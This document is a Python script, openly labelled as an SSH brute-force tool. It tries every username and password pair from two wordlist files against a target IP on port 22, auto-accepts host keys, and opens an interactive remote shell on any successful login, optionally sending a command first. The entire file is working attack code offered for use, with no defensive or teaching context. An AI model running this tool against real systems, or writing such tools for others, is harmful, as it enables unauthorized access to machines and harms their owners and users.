"""

Brute Force logging via SSH and active connection to shell

Usage: python script_name.py <IP> <UsersFilename.txt> <PasswordsFilename.txt> [Command in quotes - optional]

"""

import paramiko
import sys
import threading
import queue
import time

class SSHShell:
    def __init__(self, client, channel):
        self.client = client
        self.channel = channel
        self.input_queue = queue.Queue()

    def read_input(self):
        try:
            while True:
                user_input = input()
                self.input_queue.put(user_input + '\n')
                if user_input.lower() == 'exit':
                    break
        except EOFError:
            pass

    def run_shell(self, command=None):
        thread = threading.Thread(target=self.read_input, daemon=True)
        thread.start()

        try:
            if command:
                self.channel.sendall(command + '\n')

            while True:
                if self.channel.recv_ready():
                    sys.stdout.write(self.channel.recv(1024).decode('utf-8'))
                    sys.stdout.flush()

                if self.channel.recv_stderr_ready():
                    sys.stderr.write(self.channel.recv_stderr(1024).decode('utf-8'))
                    sys.stderr.flush()

                try:
                    user_input = self.input_queue.get(timeout=0.1)
                    self.channel.sendall(user_input)
                except queue.Empty:
                    pass

                if self.channel.exit_status_ready():
                    break
        except KeyboardInterrupt:
            pass
        finally:
            self.channel.close()

def SSH_interactive_shell_with_bruteforce(ip, port, username, password, command=None):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        print(f"Trying with {username}:{password}")
        client.connect(ip, port, username=username, password=password)

        # Enter interactive mode
        channel = client.invoke_shell()
        ssh_shell = SSHShell(client, channel)
        ssh_shell.run_shell(command)

    except paramiko.AuthenticationException:
        print("Incorrect credentials")
    except Exception as e:
        print(f"Error: {str(e)}")
    finally:
        client.close()

if __name__ == "__main__":
    try:
        if len(sys.argv) < 4 or len(sys.argv) > 5:
            print("Usage: python script.py <IP> <UsersFilename.txt> <PasswordsFilename.txt> [Command in quotes]")
            sys.exit(1)

        ip = sys.argv[1]
        users_filename = sys.argv[2]
        passwords_filename = sys.argv[3]
        command = sys.argv[4] if len(sys.argv) == 5 else None

        with open(users_filename, "r") as f:
            users = f.read().splitlines()

        with open(passwords_filename, "r") as f:
            passwords = f.read().splitlines()

        for user in users:
            for password in passwords:
                SSH_interactive_shell_with_bruteforce(ip, 22, user, password, command)
                # Wait a moment between bruteforce attempts
                time.sleep(1)

    except Exception as e:
        print(f"An error occurred: {str(e)}")
